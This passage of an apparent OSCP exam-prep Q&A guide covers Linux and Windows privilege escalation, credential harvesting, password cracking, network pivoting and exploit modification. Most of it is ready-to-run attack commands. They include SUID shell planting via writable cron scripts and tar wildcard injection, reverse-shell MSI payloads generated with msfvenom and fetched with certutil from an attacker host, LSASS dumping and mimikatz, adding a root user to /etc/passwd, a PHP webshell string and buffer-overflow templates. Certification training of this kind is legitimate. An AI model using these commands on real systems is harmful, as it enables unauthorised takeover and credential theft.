wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64

# Run for 5-10 minutes
# Shows ALL processes including cron-triggered
# Even processes from users you can't see
```

**Common cron privesc vectors:**

**1. Writable script run by root cron:**

```
* * * * * root /opt/cleanup.sh
```

If you can write to /opt/cleanup.sh:
```bash
echo '#!/bin/bash\nchmod +s /bin/bash' >> /opt/cleanup.sh
# Wait for cron to run
# Then
/bin/bash -p
# Root shell
```

**2. PATH manipulation in cron:**

```
PATH=/home/user/bin:/usr/bin:/bin
* * * * * root backup.sh
```

If `backup.sh` calls relative commands AND /home/user/bin is writable:
```bash
echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /home/user/bin/tar
chmod +x /home/user/bin/tar

# Wait for cron
# Then
/tmp/rootbash -p
```

**3. Wildcard injection:**

```
* * * * * root tar -czf /backup/files.tar.gz /home/user/*
```

```bash
cd /home/user/
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh -c "cp /bin/bash /tmp/rb; chmod +s /tmp/rb"'

# Wait
/tmp/rb -p
```

**4. Writable script directory:**

If `/etc/cron.d/` is writable:
```bash
echo '* * * * * root /tmp/rev.sh' > /etc/cron.d/evil
```

**5. Hidden cron files:**

```bash
# Sometimes cron jobs hidden
find / -name "*.cron" 2>/dev/null
find / -name "crontab" 2>/dev/null

# Anacron, atd
cat /etc/anacrontab
atq
```

**6. Race conditions in cron:**

If cron creates files in /tmp:
- Watch with pspy
- Symlink attack possible
- TOCTOU vulnerabilities

### Q35: Capabilities exploitation
**A:**

**Finding capabilities:**

```bash
getcap -r / 2>/dev/null
# Or
find / -type f -exec getcap {} \; 2>/dev/null | grep -v "= $"
```

**Dangerous capabilities and exploitation:**

**1. CAP_SETUID:**

Allows setting UID to 0:

```bash
# If /usr/bin/python3 has cap_setuid+ep
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Common GTFOBins entries for cap_setuid:
- python
- perl
- ruby
- node
- gdb
- php

**2. CAP_SETGID:**

Similar to setuid but for groups.

**3. CAP_DAC_READ_SEARCH:**

Read any file regardless of permissions:

```python
# Python with this cap on:
import ctypes

libc = ctypes.CDLL("libc.so.6")
fd = libc.open(b"/etc/shadow", 0)
buf = ctypes.create_string_buffer(2048)
libc.read(fd, buf, 2048)
print(buf.raw.decode())
```

**4. CAP_DAC_OVERRIDE:**

Write to any file regardless of permissions:

```python
# Modify /etc/passwd
import ctypes
libc = ctypes.CDLL("libc.so.6")
fd = libc.open(b"/etc/passwd", 0o0001 | 0o0100)  # O_RDWR
# Now write your malicious entry
```

**5. CAP_SYS_PTRACE:**

Trace processes - inject into root processes:

```bash
# Find root process
ps -ef | grep root

# Attach with gdb
gdb -p PID
# Inside gdb:
(gdb) call (int) setuid(0)
(gdb) call (int) system("/bin/sh")
```

**6. CAP_SYS_ADMIN:**

Many privileged operations including:
- Mount filesystems
- Configure network
- Many root-equivalent actions

**7. CAP_NET_RAW:**

Send raw packets. Useful for sniffing on local subnet.

**8. CAP_CHOWN:**

Change ownership of files:

```bash
# If /bin/chown has cap_chown+ep
chown root:root yourscript.sh
# But still need execution privs
```

**9. CAP_FOWNER:**

Bypass file ownership checks for some operations.

**10. CAP_KILL:**

Kill any process.

**Check via GTFOBins:**

Each binary has its capabilities section. Example: https://gtfobins.github.io/gtfobins/python3/#capabilities

### Q36: Kernel exploits and OS-specific
**A:**

**When to consider kernel exploits:**

**LAST RESORT** because:
- Risk of crashing system
- Often have compatibility issues
- Easier paths usually exist

But sometimes only option.

**Find kernel info:**

```bash
uname -a
cat /etc/os-release
cat /proc/version
```

**Common Linux kernel exploits to know:**

**1. Dirty COW (CVE-2016-5195):**

Affects: Linux kernel before 4.8.3
Effect: Write to read-only files

```bash
# Compile and run
gcc dirty.c -o dirty -pthread
./dirty new_password
```

**2. DirtyPipe (CVE-2022-0847):**

Affects: Linux kernel 5.8 - 5.16.10
Effect: Overwrite read-only files

```bash
# Compile
gcc dirtypipe.c -o dirtypipe

# Overwrite /etc/passwd or SUID binary
./dirtypipe /etc/passwd 1 'newroot:'
```

**3. PwnKit (CVE-2021-4034):**

Affects: pkexec (polkit)
Versions: All before patch (most distros pre-2022)

```bash
# Download
git clone https://github.com/berdav/CVE-2021-4034.git
cd CVE-2021-4034
make
./cve-2021-4034
```

**4. BPF exploits:**

Various CVEs:
- CVE-2021-3490
- CVE-2021-3489
- CVE-2022-0185

**5. Userfaultfd / WaitID exploits:**

Older kernels.

**Finding exploits:**

```bash
# searchsploit
searchsploit kernel $(uname -r)
searchsploit linux $(uname -r | cut -d '.' -f 1,2)

# linux-exploit-suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# Outputs: kernel version vs known CVEs
```

**Compile kernel exploits:**

Often need to compile on target. Common issues:
- gcc not installed
- Architecture mismatch
- Headers not available

```bash
# Check
which gcc
which cc
which clang

# If no compiler, compile elsewhere with same arch
# Then transfer binary

# Static compile to avoid library issues
gcc -static exploit.c -o exploit
```

**Pre-compiled exploits:**

GitHub repos with compiled exploits:
- https://github.com/SecWiki/linux-kernel-exploits

But verify before running.

**Container escapes:**

If in container:
```bash
# Check
ls /.dockerenv
cat /proc/1/cgroup

# Common escapes:
# - Mounted Docker socket
# - --privileged container
# - Capabilities
# - Kernel exploits
```

**Mounted Docker socket:**

```bash
# If /var/run/docker.sock writable
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Now root on host.

### Q37: Other Linux privesc patterns
**A:**

**1. Writable /etc/passwd:**

```bash
ls -la /etc/passwd
# If writable by you:

# Generate hash
openssl passwd -1 -salt salt password123
# Output: $1$salt$encrypted

# Add user
echo 'evil:$1$salt$encrypted:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch
su evil
# Password: password123
```

**2. Writable /etc/shadow:**

Rare but possible:
```bash
# Generate new hash
mkpasswd -m sha-512 newpassword

# Replace root's hash in /etc/shadow
# Original: root:$6$xxx:...
# Modified: root:$6$newxxx:...

su root
```

**3. NFS no_root_squash:**

```bash
# On target
showmount -e localhost

# If you see no_root_squash, exploit from attacker
# (covered earlier)
```

**4. Docker group:**

If your user is in `docker` group:
```bash
# Without needing sudo
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Root on host
```

**5. lxd group:**

```bash
# Add image
lxc image import alpine.tar.gz --alias myalpine

# Create container with host filesystem mounted
lxc init myalpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

# Inside: chroot /mnt/root /bin/bash
```

**6. Disk group:**

Access to raw disk = read /etc/shadow:
```bash
# If in disk group
debugfs /dev/sda1
debugfs: cat /etc/shadow
```

**7. ADM group:**

Access to log files including auth logs:
```bash
# May reveal passwords typed at sudo
cat /var/log/auth.log
cat /var/log/secure
```

**8. Polkit / PolicyKit:**

CVE-2021-3560:
- Affects polkit/PolicyKit
- Allows user creation

**9. Hijacking python imports:**

If a root script imports a module from path you control:
```bash
# Find script that imports
grep -r "import " /opt 2>/dev/null

# If imports from /home/user/scripts/
# Create malicious module there
cat > /home/user/scripts/somemodule.py << 'EOF'
import os
os.system("cp /bin/bash /tmp/rb; chmod +s /tmp/rb")
EOF

# Wait for cron or trigger
/tmp/rb -p
```

**10. Backup file analysis:**

```bash
# Search for credentials in backups
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
find / -name "*.old" 2>/dev/null

# In .bash_history (other users)
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
```

**11. SSH key on filesystem:**

```bash
# Find SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Test discovered keys
ssh -i found_key root@localhost
```

**12. Hardcoded credentials in files:**

```bash
# Search common patterns
grep -r "password" /etc/ 2>/dev/null
grep -r "PASSWORD" /opt/ 2>/dev/null
grep -ri "passwd" /var/ 2>/dev/null | grep -v Binary

# Config files often have DB passwords
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*.config" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*.ini" -exec grep -l "password" {} \; 2>/dev/null
```

**Tip:** Many machines have passwords reused. User password → root password sometimes works.

---

## SECTION D: WINDOWS PRIVILEGE ESCALATION (Q38-43)

### Q38: Windows privesc methodology
**A:**

**Systematic Windows enumeration:**

**Step 1: Automated tools**

```powershell
# WinPEAS (recommended)
.\winPEAS.exe systeminfo userinfo processinfo servicesinfo applicationsinfo networkinfo

# Or download then run
iwr -uri http://10.10.14.1/winPEASx64.exe -outfile winpeas.exe
.\winpeas.exe

# PowerUp.ps1
. .\PowerUp.ps1
Invoke-AllChecks

# Sherlock (older but useful for kernel)
. .\Sherlock.ps1
Find-AllVulns

# Watson (newer, .NET)
.\Watson.exe
```

**Step 2: Manual checks**

```cmd
:: Current context
whoami
whoami /all
whoami /priv
whoami /groups

:: System info
systeminfo
hostname
echo %username%
echo %userdomain%

:: Users
net user
net user %username%
net localgroup
net localgroup administrators

:: Services
sc query
wmic service get name,displayname,pathname,startmode

:: Processes
tasklist /v
wmic process get name,executablepath,processid

:: Installed software
wmic product get name,version
dir "C:\Program Files"
dir "C:\Program Files (x86)"

:: Scheduled tasks
schtasks /query /fo LIST /v

:: Network
ipconfig /all
netstat -ano
arp -a
route print

:: Drives and shares
net share
fsutil fsinfo drives
wmic logicaldisk get name

:: Patches
wmic qfe get Caption,Description,HotFixID,InstalledOn
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

**Step 3: Categorize**

Privesc vectors fall into categories:
1. **Stored credentials**
2. **Service misconfigurations**
3. **Registry permissions**
4. **Token impersonation**
5. **Vulnerable software**
6. **Kernel exploits**
7. **DLL hijacking**
8. **Unattend files**

**Step 4: Quick wins first**

Priority:
1. Stored credentials (Cred Manager, files)
2. AlwaysInstallElevated
3. Unquoted service paths
4. Token privileges (SeImpersonate)
5. Weak service permissions
6. Kernel exploit (if matches)

### Q39: Service-based Windows privesc
**A:**

**1. Unquoted Service Paths:**

When service path contains spaces but no quotes:

```cmd
:: Find vulnerable
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

:: Example vulnerable
:: C:\Program Files\My App\service.exe (no quotes!)
```

Windows tries paths in order:
- C:\Program.exe
- C:\Program Files\My.exe
- C:\Program Files\My App\service.exe

If you can write to any earlier path, you can replace service binary.

**Exploit:**

```cmd
:: Generate payload
msfvenom -p windows/x64/exec CMD="net localgroup administrators yourusername /add" -f exe > C:\My.exe

:: Wait for service restart or restart manually if you can
sc stop "vulnerable service"
sc start "vulnerable service"

:: User added to admins
```

**2. Weak Service Permissions:**

If you can modify service config:

```cmd
:: Check service permissions
accesschk.exe -uwcqv "Authenticated Users" *

:: Or specific service
accesschk.exe -ucqv vulnerable_service

:: If you have SERVICE_CHANGE_CONFIG:
sc config vulnerable_service binpath= "cmd.exe /c net localgroup administrators yourusername /add"
sc config vulnerable_service obj= ".\LocalSystem" password= ""

:: Restart service
sc stop vulnerable_service
sc start vulnerable_service
```

**3. Weak Service Binary Permissions:**

If service binary is writable:

```cmd
:: Check
icacls "C:\Program Files\service\binary.exe"

:: If writable, replace
copy malicious.exe "C:\Program Files\service\binary.exe" /Y

:: Restart service
sc stop service
sc start service
```

**4. DLL Hijacking:**

Service loads DLL from writable location:

```cmd
:: Find missing DLLs (use procmon - tedious)
:: Or use known vulnerable services

:: Once DLL identified:
:: Generate
msfvenom -p windows/x64/exec CMD="net localgroup administrators user /add" -f dll > evil.dll

:: Place in load path
copy evil.dll C:\path\service\loads\

:: Restart
sc stop service
sc start service
```

**5. AlwaysInstallElevated:**

Both keys must be set to 1:

```cmd
:: Check
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both = 1:

```cmd
:: Generate MSI
msfvenom -p windows/exec CMD="net localgroup administrators user /add" -f msi > evil.msi

:: Install (runs as SYSTEM)
msiexec /quiet /qn /i evil.msi
```

**6. Registry Permissions:**

Check registry keys for services:

```cmd
:: HKLM\SYSTEM\CurrentControlSet\Services\<service>
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Vulnerable"

:: Check permissions with PowerUp:
Get-RegistryAlwaysInstallElevated
Get-ModifiableRegistryAutoRun
```

If you have write access to a service registry key, modify ImagePath.

### Q40: Token impersonation (SeImpersonate)
**A:**

**Identify privilege:**

```cmd
whoami /priv

:: Look for:
:: SeImpersonatePrivilege - "Impersonate a client after authentication"
:: SeAssignPrimaryTokenPrivilege
:: SeTcbPrivilege
:: SeBackupPrivilege
:: SeRestorePrivilege
:: SeDebugPrivilege
:: SeTakeOwnershipPrivilege
```

**Common holders of SeImpersonate:**

- LOCAL SERVICE
- NETWORK SERVICE
- IIS apppool identities
- SQL Server service account
- Most service accounts

**Modern Potato exploits:**

**1. PrintSpoofer (most reliable, modern):**

```cmd
.\PrintSpoofer.exe -i -c cmd.exe
:: Or
.\PrintSpoofer.exe -c "net localgroup administrators user /add"
```

Works on Windows 10/11/Server 2019/2022.

**2. GodPotato (newest, broad compat):**

```cmd
.\GodPotato.exe -cmd "cmd /c net localgroup administrators user /add"
.\GodPotato.exe -cmd "cmd /c powershell -c IEX(...)"
```

Often works when others fail.

**3. JuicyPotato (older Windows):**

```cmd
.\JuicyPotato.exe -l 9999 -p c:\windows\system32\cmd.exe -t * -c {CLSID}
```

CLSIDs are OS-specific. Lookup at https://ohpe.it/juicy-potato/CLSID/

**4. RoguePotato (Windows 10 build < 1809):**

```cmd
.\RoguePotato.exe -r 10.10.14.1 -e "C:\malicious.exe" -l 9999
```

Requires attacker-side OXID listener.

**5. SweetPotato, GenericPotato, JuicyPotatoNG:**

Variants for specific scenarios.

**Which to use:**

1. Try PrintSpoofer first
2. If fails, try GodPotato
3. If older OS, try JuicyPotato (need CLSID)
4. Different versions for different scenarios

**Other privilege abuses:**

**SeBackupPrivilege:**

Read any file:

```powershell
# Backup SAM and SYSTEM
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# Transfer to attacker
# Extract hashes
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

**SeRestorePrivilege:**

Write to any file. Can replace service binaries.

**SeTakeOwnership:**

```cmd
:: Take ownership of file
takeown /f C:\path\to\file

:: Grant yourself full control
icacls C:\path\to\file /grant %username%:F

:: Now modify
```

**SeDebug:**

```powershell
# Open privileged process, steal token
# Or dump LSASS
procdump -ma lsass.exe lsass.dmp
# Or mimikatz
sekurlsa::logonpasswords
```

### Q41: Stored credentials on Windows
**A:**

**Credential locations to check:**

**1. Credential Manager:**

```cmd
cmdkey /list

:: If credentials shown
:: Try runas with /savecred
runas /user:domain\admin /savecred cmd.exe
:: Doesn't show password but executes as admin
```

**2. Unattend files:**

```cmd
:: Check common locations
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\Panther\Unattend\Unattended.xml
type C:\Windows\system32\sysprep.inf
type C:\Windows\system32\sysprep\sysprep.xml
type C:\unattend.xml

:: Search recursively
dir /s /b C:\*Unattend* 2>nul
dir /s /b C:\*sysprep* 2>nul
```

Contains base64 encoded passwords often:
```xml
<AutoLogon>
    <Password>
        <Value>cABhAHMAcwB3AG8AcgBkAFAAYQBzAHMAdwBvAHIAZAA=</Value>
    </Password>
    <Username>Administrator</Username>
</AutoLogon>
```

Decode:
```bash
echo "cABhAHMAcwB3AG8AcgBkAFAAYQBzAHMAdwBvAHIAZAA=" | base64 -d
```

**3. PowerShell history:**

```powershell
# Check current user
(Get-PSReadlineOption).HistorySavePath
Get-Content (Get-PSReadlineOption).HistorySavePath

# Common locations
type %appdata%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**4. Browser passwords:**

```powershell
# Chrome
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

# Decrypt via DPAPI
# Tools: SharpChromium, SharpChrome, etc.
.\SharpChromium.exe logins
```

**5. KeePass / Password managers:**

```powershell
# Search for KeePass DB
Get-ChildItem -Path C:\ -Filter *.kdbx -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Filter *.kdb -Recurse -ErrorAction SilentlyContinue
```

If found, crack offline:
```bash
keepass2john file.kdbx > hash
john --wordlist=rockyou.txt hash
```

**6. Wi-Fi profiles:**

```cmd
netsh wlan show profiles
netsh wlan show profile name="WifiName" key=clear
```

Plaintext WiFi password.

**7. Registry:**

```cmd
:: VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password

:: Autologon
reg query "HKLM\Software\Microsoft\Windows NT\Currentversion\Winlogon"

:: Putty saved
reg query "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions"
```

**8. AutoLogon:**

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr "DefaultUserName DefaultPassword"
```

**9. Config files:**

```powershell
# Search for files with passwords
findstr /si "password" *.txt *.ini *.config *.xml *.bat 2>nul
Get-ChildItem c:\ -Include *.txt,*.ini,*.config,*.xml -Recurse -ErrorAction SilentlyContinue | Select-String "password"
```

**10. Files in common dev locations:**

```cmd
:: VS Code workspaces
dir /s /b %APPDATA%\Code\User\*.json 2>nul

:: Application configs
type C:\inetpub\wwwroot\web.config
type C:\xampp\apache\conf\httpd.conf
```

**11. GitHub credentials:**

```cmd
:: Git config
type %USERPROFILE%\.gitconfig
type %USERPROFILE%\.git-credentials

:: SSH keys
dir %USERPROFILE%\.ssh
```

### Q42: AlwaysInstallElevated detailed
**A:**

**Background:**

Group Policy setting that allows ANY user to install MSI packages as SYSTEM.

**Check:**

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Both must equal 1:**

```
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

**Exploitation:**

```bash
# On Kali, generate MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f msi -o evil.msi
```

Or simple command:
```bash
msfvenom -p windows/x64/exec CMD="cmd.exe /c net localgroup administrators user /add" -f msi -o evil.msi
```

**Transfer to target:**

```cmd
:: From target
certutil -urlcache -split -f http://10.10.14.1/evil.msi C:\Temp\evil.msi

:: Run as user (will execute as SYSTEM)
msiexec /quiet /qn /i C:\Temp\evil.msi
```

**Listener (if reverse shell):**

```bash
nc -lvnp 4444
```

**Why this works:**

The MSI installer service runs as SYSTEM. When AlwaysInstallElevated is set, ANY user's MSI install runs at that level. Custom Action in MSI executes anything you put in.

**Generating with PowerSploit:**

```powershell
# PowerUp
Write-UserAddMSI

# Creates UserAdd.msi in current directory
# Install
msiexec /quiet /qn /i UserAdd.msi
# Prompts for username and password
```

**For OSCP:** Always check this. It's a quick win when present.

### Q43: Kernel exploits Windows
**A:**

**Find applicable exploits:**

**1. Manual check:**

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

**2. Watson (automated):**

```powershell
.\Watson.exe
```

Watson checks installed patches against known privesc CVEs.

**3. Windows Exploit Suggester:**

```bash
# On Kali
windows-exploit-suggester.py --update
windows-exploit-suggester.py -d 2024-01-01-mssb.xls -i sysinfo.txt
```

**4. Sherlock (older, PowerShell):**

```powershell
. .\Sherlock.ps1
Find-AllVulns
```

**Common Windows kernel exploits:**

**1. PrintNightmare (CVE-2021-34527):**

```powershell
# Various exploit scripts available
# Some don't need admin
```

**2. HiveNightmare (CVE-2021-36934):**

Anyone can read SAM/SYSTEM hives.

```powershell
# Check if vulnerable
icacls C:\Windows\System32\config\SAM
# If Builtin\Users has Read access, vulnerable

# Exploit via shadow copies
```

**3. RemotePotato (CVE-2021-1675):**

Privilege escalation via RPC.

**4. MS16-032:**

Older but still seen on legacy systems.

**5. Token Kidnapping:**

Older Windows 2003/XP.

**6. Print Spooler attacks:**

Multiple CVEs.

**Practical kernel exploit workflow:**

```cmd
:: 1. Get system info
systeminfo > sysinfo.txt
:: Transfer to Kali

:: 2. On Kali, suggester
windows-exploit-suggester.py -d 2024-01-01-mssb.xls -i sysinfo.txt

:: 3. Check matched exploits
:: Download/compile

:: 4. Transfer to target
:: 5. Execute

:: WARNING: Test in lab first - can crash system
```

**Older Windows kernel exploits (often pre-compiled):**

- ms11-046.exe
- ms11-080.exe
- ms14-058.exe (TrackPopupMenuEx)
- ms14-068 (Kerberos checksum)
- ms16-032.ps1 (Secondary Logon)
- ms16-075.exe (Hot Potato)

**For OSCP:**

Older lab machines often vulnerable to:
- MS15-051
- MS16-032
- MS16-075

Have pre-compiled binaries ready (multiple architectures).

---

## SECTION E: PASSWORD ATTACKS, PIVOTING, EXPLOIT MOD (Q44-50)

### Q44: Password attacks for OSCP
**A:**

**Hash identification:**

```bash
# Identify hash type
hashid 'hash_value'
hash-identifier
```

**Common OSCP hash types and Hashcat modes:**

```
0       MD5
100     SHA1
500     md5crypt $1$ (Linux)
1400    SHA256
1800    sha512crypt $6$ (Linux modern)
1000    NTLM (Windows hash)
3200    bcrypt $2*$
13100   Kerberos 5 TGS-REP (Kerberoasting)
18200   Kerberos 5 AS-REP (ASREP roast)
5500    NetNTLMv1
5600    NetNTLMv2 (Responder)
2100    Domain Cached Credentials 2 (DCC2)
13400   KeePass
22000   WPA-PBKDF2-PMKID+EAPOL
```

**Hashcat usage:**

```bash
# Basic
hashcat -m 1000 ntlm_hashes.txt rockyou.txt

# With rules
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?l?d?d
# U=upper, l=lower, d=digit, s=special, ?a=all

# Common patterns
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?l?l?l?d?d?d?d  # 8 letters + 4 digits
hashcat -m 1000 hashes.txt -a 3 -i Password?d?d?d?d?d  # Password00000 to Password99999

# Hybrid (wordlist + mask)
hashcat -m 1000 hashes.txt -a 6 rockyou.txt ?d?d?d?d  # word + 4 digits
hashcat -m 1000 hashes.txt -a 7 ?d?d?d?d rockyou.txt  # 4 digits + word

# Show cracked
hashcat -m 1000 hashes.txt --show
```

**John the Ripper:**

```bash
# Auto-detect
john hashes.txt --wordlist=rockyou.txt

# Specific format
john --format=nt hashes.txt --wordlist=rockyou.txt

# Show cracked
john --show hashes.txt

# With rules
john --wordlist=rockyou.txt --rules hashes.txt
```

**Specific formats with John:**

```
nt              NTLM
nt2             NTLMv2  
descrypt        DES-based crypt(3)
md5crypt        $1$
sha512crypt     $6$
krb5tgs         Kerberos TGS
krb5asrep       Kerberos AS-REP
```

**Rules to know:**

```bash
# Hashcat rules
/usr/share/hashcat/rules/
├── best64.rule
├── d3ad0ne.rule
├── dive.rule
├── leetspeak.rule
├── rockyou-30000.rule
├── T0XlC.rule
└── ...

# Custom rule for password rotation
# Append year, month, etc
echo '$2$0$1$8' > custom.rule
# Appends "2018"
```

**Custom wordlists:**

Generate from target:
```bash
# cewl - scrape website
cewl http://target.com -w wordlist.txt -d 3 -m 4

# CRUNCH - generate combinations
crunch 8 10 -t Pass@word^^^ -o wordlist.txt

# Combine
john --wordlist=wordlist.txt --rules
```

**Common OSCP password patterns:**

- Season + Year (Spring2024, Summer2024)
- Welcome + Number (Welcome1, Welcome123)
- Password + Number (Password1, Password123!)
- Company + Year (Acme2024)
- Service name + Number (Apache1, SQL2024)

Always include these in custom wordlists.

**Cracking with john + hashcat combination:**

```bash
# Get easy ones first with john
john --wordlist=rockyou.txt hashes.txt

# Hard ones with hashcat + GPU + rules
hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule --force
```

**Time-saving tips:**

1. Try common passwords first (Password1, admin, etc.)
2. Use --increment with masks if length unknown
3. Custom rules for the target environment
4. Combine wordlists (RockYou + SecLists + custom)
5. Use GPU acceleration if available

### Q45: Network pivoting for OSCP
**A:**

**Why pivot in OSCP AD chain:**

- Initial machine has access to internal network
- Need to reach other AD machines from your Kali
- Or scan from inside the network

**Method 1: Chisel (most popular):**

```bash
# On Kali (attacker)
./chisel server -p 8000 --reverse

# On compromised Windows
chisel.exe client 10.10.14.1:8000 R:1080:socks
```

Now port 1080 on Kali is SOCKS proxy through compromised machine.

**Use with proxychains:**

```bash
# Edit /etc/proxychains4.conf, add:
socks5 127.0.0.1 1080

# Use any tool through it
proxychains nmap 10.10.20.0/24
proxychains psexec.py user@10.10.20.5
proxychains crackmapexec smb 10.10.20.0/24 -u user -p pass
```

**Chisel on Linux pivot:**

```bash
# On Linux target (after compromise)
./chisel client 10.10.14.1:8000 R:1080:socks
```

**Method 2: Ligolo-ng (newer, faster):**

```bash
# On Kali
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

./proxy -selfcert

# On target
./agent -connect 10.10.14.1:11601 -ignore-cert

# Back on Kali
session 1
ifconfig
# Note target's network
start
# Routes traffic through tun
```

Now you can directly reach internal subnet from Kali.

**Method 3: SSH (if accessible):**

```bash
# Local port forward (specific port)
ssh -L 8080:internal_host:80 user@pivot

# Dynamic SOCKS (more flexible)
ssh -D 1080 user@pivot
# Then use proxychains
proxychains tool

# Reverse port forward (rare for OSCP)
ssh -R 4444:localhost:4444 user@attacker
```

**Method 4: Plink (PuTTY CLI for Windows):**

When SSH not natively on Windows:

```cmd
plink.exe -l user -pw pass -R 8080:localhost:8080 10.10.14.1
```

**Method 5: Netsh (Windows native):**

```cmd
:: Port forward on Windows pivot
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.20.5

:: Now access through pivot's port 8080
```

Need admin for netsh.

**Method 6: Sshuttle (poor man's VPN):**

```bash
# On Kali
sshuttle -r user@pivot 10.10.20.0/24

# Now you can directly access 10.10.20.0/24
```

**Practical OSCP pivot scenarios:**

**Scenario A: Linux pivot**

```
You (Kali) → Linux web server (compromised) → AD network (10.10.20.0/24)
```

```bash
# Get SSH access on Linux (via found credentials)
ssh user@linux_server

# Establish SOCKS
ssh -D 1080 user@linux_server

# Use proxychains
proxychains nmap -Pn 10.10.20.5
```

**Scenario B: Windows pivot (chisel)**

```
You (Kali) → Windows machine (you have shell) → AD network
```

```cmd
:: Download chisel to target
certutil -urlcache -split -f http://10.10.14.1/chisel.exe C:\Temp\chisel.exe

:: Run
C:\Temp\chisel.exe client 10.10.14.1:8000 R:1080:socks
```

**Pivoting through 2+ machines:**

```
Kali → Machine A → Machine B → Target
```

```bash
# On Kali
chisel server -p 8000 --reverse

# On A
chisel.exe client 10.10.14.1:8000 R:1080:socks

# Now A's network accessible on Kali:1080

# Through SOCKS, connect another chisel session to B
proxychains chisel server -p 8001 --reverse

# On B  
chisel.exe client A_internal_ip:8001 R:1081:socks
```

Now Kali:1081 = SOCKS through B.

**For OSCP AD chain:**

You'll likely:
1. Compromise Machine 1 (foothold)
2. Set up chisel SOCKS
3. Use proxychains for Machine 2/3 attacks
4. Or use ligolo-ng for cleaner experience

Practice this in lab before exam.

### Q46: Exploit modification
**A:**

**Why modify exploits:**

- Original doesn't work on your version
- Wrong architecture
- Shellcode needs updating
- Different language needed
- Public exploit detected by AV

**Common modifications needed:**

**1. Update LHOST/LPORT:**

```python
# Original
LHOST = "192.168.1.10"
LPORT = 4444

# Change to yours
LHOST = "10.10.14.1"
LPORT = 9001
```

**2. Generate new shellcode:**

```bash
# Replace shellcode in exploit
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f c -b "\x00"
```

Replace bytes in exploit code.

**3. Adjust offsets:**

For BOF or specific exploits, offsets vary per Windows version.

```python
# Original
offset = 146
ret_addr = "\x42\x42\x42\x42"

# Adjust based on target
# Find offset via fuzzing/pattern_create
```

**4. Python 2 to Python 3:**

```python
# Python 2
print "Sending exploit"
import socket
s = socket.socket()
s.connect((target, port))
s.send("payload")

# Python 3
print("Sending exploit")
import socket
s = socket.socket()
s.connect((target, port))
s.send(b"payload")
```

Key changes:
- `print` → `print()`
- Strings → bytes for socket send
- `urllib` → `urllib.request`
- `xrange` → `range`
- `raw_input` → `input`

**5. URL encoding payloads:**

```python
import urllib.parse
payload = urllib.parse.quote('<?php system($_GET["c"]); ?>')
```

**6. Bypass character filters:**

If exploit fails due to bad chars:
```python
# Find bad chars
# Standard bad chars: \x00 \x0a \x0d \x20
# But test each byte 1-255

# Generate badchar wordlist
badchars = b''
for i in range(1, 256):
    badchars += bytes([i])

# Send, see which ones get filtered
```

**7. Adjusting buffer offsets:**

For padding adjustments:
```python
buffer = b"A" * 146  # Padding
buffer += b"\xef\xbe\xad\xde"  # EIP overwrite
buffer += b"\x90" * 16  # NOP sled
buffer += shellcode
```

**8. Compiling C exploits:**

```bash
# Standard
gcc exploit.c -o exploit

# 32-bit on 64-bit system
gcc -m32 exploit.c -o exploit32

# Static (avoid lib dependencies)
gcc -static exploit.c -o exploit

# With specific compiler flags
